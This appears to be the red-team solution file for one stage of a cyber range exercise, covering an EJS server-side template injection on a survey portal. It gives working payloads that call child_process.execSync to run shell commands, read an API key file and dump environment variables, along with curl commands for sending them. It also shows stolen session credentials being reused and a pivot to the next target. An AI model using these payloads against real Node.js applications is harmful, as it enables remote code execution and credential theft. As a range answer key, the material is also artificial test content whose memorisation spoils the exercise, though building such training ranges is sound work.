# solve_red.md — M4 · ext-survey-portal
## Red Team Solution — EJS Server-Side Template Injection → RCE
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Vulnerability:** SSTI via EJS — CWE-1336
**MITRE:** T1190 · T1059 (Command and Scripting Interpreter)

---

## Phase 1 — Authentication (IMDS credentials from M3)

From M3's XXE→SSRF→IMDS exploit, the response contained:
```json
{
    "AccessKeyId":     "ASIAxxxxxxxxxxxxxxxxxxxx",
    "SecretAccessKey": "...",
    "Token":           "xxxxxxxx...128-char hex...xxxxxxxx",
    "_rpal_endpoint":  "http://203.x.x.x:3000"
}
```

Navigate to `http://203.x.x.x:3000/` and log in:
- **AWS Access Key ID:** paste the `AccessKeyId` value
- **Session Token:** paste the `Token` value

On successful login you reach the Geological Survey Dashboard.

---

## Phase 2 — Identify the SSTI Vector

The dashboard has a **Report Generator** panel with a textarea labeled "Report Template (EJS syntax supported)". This is the hint — user input goes directly into `ejs.render()`.

**Test for SSTI** with arithmetic:
```
<%= 7 * 7 %>
```
Click Generate Report. If the output shows `49`, SSTI is confirmed.

---

## Phase 3 — Exploit SSTI for RCE

EJS executes arbitrary JavaScript inside `<%= ... %>` tags. The Node.js `child_process` module allows OS command execution:

**Payload — read the M5 API key:**
```ejs
<%= global.process.mainModule.require('child_process').execSync('cat /etc/rpal/contractor/api-key.txt').toString() %>
```

**Via curl:**
```bash
# First login to get session cookie
curl -s -c /tmp/survey.jar -X POST http://203.x.x.x:3000/login \
  -d "accessKeyId=ASIA...&token=..." -L > /dev/null

# Send SSTI payload
curl -s -b /tmp/survey.jar -X POST http://203.x.x.x:3000/api/reports/generate \
  -H "Content-Type: application/json" \
  -d '{"site":"KG-DWN-98/3","template":"<%= global.process.mainModule.require(\"child_process\").execSync(\"cat /etc/rpal/contractor/api-key.txt\").toString() %>"}'
```

**Expected response:**
```json
{
    "success": true,
    "output": "# RPAL Contractor Registration System — API Access Key\n# ...\nRPAL-CONTRACTOR-API-2024-xK9mP3nT8qRs7vL2\n"
}
```

**Additional RCE payloads:**
```ejs
<%# List accessible files %>
<%= global.process.mainModule.require('child_process').execSync('ls -la /etc/rpal/').toString() %>

<%# Get process info — reveals service user %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

<%# Enumerate environment variables %>
<%= JSON.stringify(process.env) %>
```

---

## Pivot to M5

The API key extracted: `RPAL-CONTRACTOR-API-2024-xK9mP3nT8qRs7vL2`

Use it against the Contractor Registration System (M5) at `http://203.x.x.x:4000/`:
```bash
curl -s http://203.x.x.x:4000/api/contractors \
  -H "X-Api-Key: RPAL-CONTRACTOR-API-2024-xK9mP3nT8qRs7vL2"
```

---
*solve_red.md | M4 ext-survey-portal | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
